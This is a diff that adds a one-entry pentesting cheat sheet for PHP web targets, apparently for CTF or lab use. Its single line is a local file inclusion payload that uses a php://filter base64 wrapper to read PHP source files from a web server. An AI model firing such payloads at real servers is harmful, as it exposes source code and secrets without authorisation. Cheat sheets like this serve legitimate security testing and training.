@@ -1,0 +1,4 @@
+% Web: PHP
+
+# Try reading PHP code
+echo http://<url>/<php-file>.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/<php-file>.php
